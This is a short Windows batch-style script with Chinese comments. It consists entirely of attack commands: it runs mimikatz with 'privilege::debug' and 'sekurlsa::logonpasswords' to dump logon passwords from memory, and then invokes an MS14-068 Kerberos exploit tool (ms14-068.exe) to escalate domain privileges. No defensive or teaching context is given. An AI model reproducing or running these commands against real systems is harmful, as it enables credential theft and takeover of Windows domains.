rem privilege::debug
rem # # rem //提升权限第二条：
rem sekurlsa::logonpasswords
rem # # rem //抓取密码

mimikatz.exe
privilege::debug
rem # # rem //提升权限第二条：
sekurlsa::logonpasswords
rem # # rem //抓取密码
pause
rem

rem

rem

rem 使用ms14-068漏洞

ms14-068.exe -u -p -s -d 


